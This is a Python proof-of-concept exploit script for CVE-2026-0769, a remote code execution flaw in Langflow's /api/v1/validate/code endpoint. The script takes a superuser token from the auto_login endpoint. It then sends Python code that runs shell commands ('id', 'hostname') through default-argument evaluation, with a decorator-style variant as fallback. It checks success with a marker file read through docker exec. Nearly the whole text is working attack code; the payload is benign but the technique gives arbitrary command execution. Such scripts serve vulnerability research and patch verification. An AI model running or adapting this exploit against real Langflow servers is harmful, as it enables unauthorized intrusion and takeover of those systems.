#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Langflow Eval Injection RCE — Vector 4 (Validate Code)
# CVE            : CVE-2026-0769
# Vendor         : langflow-ai
# Product        : Langflow
# Affected       : 1.0.0 through 1.8.0 (latest)
# Type           : CWE-95 - Eval Injection
# CVSS           : 9.8 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-01-23
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-0769 Vector 4: /api/v1/validate/code Endpoint RCE

Exploits a COMPLETELY DIFFERENT code path from the custom_component endpoints.
validate_code() at validate.py:57 exec()'s FunctionDef AST nodes. Since exec()
on a FunctionDef only defines (not calls) the function, Python's default argument
evaluation is used to achieve RCE at definition time.

ATTACK CHAIN:
  1. GET /api/v1/auto_login → obtain superuser JWT
  2. POST /api/v1/validate/code with FunctionDef payload
  3. validate_code() at validate.py:57 exec()'s FunctionDef
  4. Default argument expression evaluates at definition time → RCE

PREREQUISITES:
  - Target running Langflow 1.0.0–1.8.0 with AUTO_LOGIN=True (default)
  - Network access to port 7860

REFERENCES:
  - CVE-2026-0769
  - https://www.zerodayinitiative.com/advisories/ZDI-26-035/
"""

import json
import sys
import urllib.request
import urllib.error
import uuid
import subprocess
import time

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 7860
MARKER = "CVE-2026-0769-VALIDATE-" + uuid.uuid4().hex[:8]
MARKER_FILE = "/tmp/cve-2026-0769-validate-marker"


def get_auth_token(base_url):
    """Obtain superuser JWT via auto_login."""
    url = base_url + "/api/v1/auto_login"
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read().decode())
        return data["access_token"]


def exploit(target_host, target_port, container_name="cve-2026-0769-vulnerable"):
    """
    Exploit CVE-2026-0769 via /api/v1/validate/code endpoint.

    Uses Python default argument evaluation trick:
      def f(x=MALICIOUS_EXPRESSION): pass
    The expression is evaluated at function definition time (during exec()).
    """
    base_url = "http://" + target_host + ":" + str(target_port)

    print("=" * 60)
    print("  CVE-2026-0769 Vector 4: /validate/code RCE")
    print("  Target: " + base_url)
    print("  Endpoint: POST /api/v1/validate/code")
    print("  Technique: Default argument evaluation at def-time")
    print("=" * 60)
    print()

    # Step 1: Auth
    print("[*] Getting auth token...")
    token = get_auth_token(base_url)
    print("[+] Got token: " + token[:40] + "...")

    # Step 2: Build payload using default argument evaluation trick
    # validate_code() exec()'s the FunctionDef -> default args are evaluated
    # We use __import__() since imports are not in the exec() scope
    payload_code = (
        "def exploit_via_defaults(\n"
        "    _rce_write=__import__('builtins').open('" + MARKER_FILE + "', 'w').write(\n"
        "        '" + MARKER + "\\n'\n"
        "        + 'endpoint: /api/v1/validate/code\\n'\n"
        "        + 'technique: default argument evaluation\\n'\n"
        "        + 'code_path: validate_code() exec() at validate.py:57\\n'\n"
        "        + 'id: ' + __import__('subprocess').check_output(['id'], text=True).strip() + '\\n'\n"
        "        + 'hostname: ' + __import__('subprocess').check_output(['hostname'], text=True).strip() + '\\n'\n"
        "    )\n"
        "):\n"
        "    pass\n"
    )

    print("[*] Sending default-arg exploit to /api/v1/validate/code...")
    print("[*] Marker: " + MARKER)
    print("[*] Technique: default argument evaluated during exec() of FunctionDef")

    body = json.dumps({"code": payload_code}).encode("utf-8")
    headers = {
        "Authorization": "Bearer " + token,
        "Content-Type": "application/json",
    }

    url = base_url + "/api/v1/validate/code"
    try:
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=30) as resp:
            status = resp.status
            resp_body = resp.read().decode()
            print("[+] HTTP " + str(status) + " response received")
            print("[+] Response: " + resp_body[:300])
    except urllib.error.HTTPError as e:
        resp_body = e.read().decode()
        print("[!] HTTP " + str(e.code) + ": " + str(e.reason))
        print("[!] Response: " + resp_body[:300])

    # Step 3: Verify
    time.sleep(0.5)
    print("[*] Verifying exploitation...")
    result = subprocess.run(
        ["docker", "exec", container_name, "cat", MARKER_FILE],
        capture_output=True, text=True, timeout=10
    )

    if result.returncode == 0 and MARKER in result.stdout:
        print("[+] =============================================")
        print("[+]  CONFIRMED: /validate/code endpoint is vulnerable!")
        print("[+]  Technique: Default argument evaluation")
        print("[+]  exec() path: validate_code() at validate.py:57")
        print("[+] =============================================")
        for line in result.stdout.strip().split("\n"):
            print("[+] " + line)
        subprocess.run(["docker", "exec", container_name, "rm", "-f", MARKER_FILE],
                       capture_output=True, timeout=5)
        return True
    else:
        print("[-] Default argument exploit did not produce marker")
        print("[-] stderr: " + result.stderr.strip())

        # Fallback: try decorator-based technique
        print()
        print("[*] Trying fallback: decorator-based execution...")
        fallback_payload = (
            "# Decorator is evaluated at function definition time during exec()\n"
            "def exploit_via_decorator(\n"
            "    _w=exec(\n"
            "        \"__import__('builtins').open('" + MARKER_FILE + "', 'w')\"\n"
            "        \".write('" + MARKER + "\\\\ndecorator_fallback\\\\n')\"\n"
            "    )\n"
            "):\n"
            "    pass\n"
        )

        fallback_body = json.dumps({"code": fallback_payload}).encode("utf-8")
        try:
            req = urllib.request.Request(url, data=fallback_body, headers=headers, method="POST")
            with urllib.request.urlopen(req, timeout=30) as resp:
                print("[+] Fallback: HTTP " + str(resp.status))
        except urllib.error.HTTPError as e:
            print("[!] Fallback: HTTP " + str(e.code))

        time.sleep(0.5)
        result2 = subprocess.run(
            ["docker", "exec", container_name, "cat", MARKER_FILE],
            capture_output=True, text=True, timeout=10
        )

        if result2.returncode == 0 and MARKER in result2.stdout:
            print("[+] CONFIRMED via fallback technique!")
            for line in result2.stdout.strip().split("\n"):
                print("[+] " + line)
            subprocess.run(["docker", "exec", container_name, "rm", "-f", MARKER_FILE],
                           capture_output=True, timeout=5)
            return True
        else:
            print("[-] Fallback also failed")
            print("[-] The validate/code endpoint may not be exploitable with this approach")
            return False


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    container = sys.argv[3] if len(sys.argv) > 3 else "cve-2026-0769-vulnerable"
    success = exploit(target, port, container)
    sys.exit(0 if success else 1)
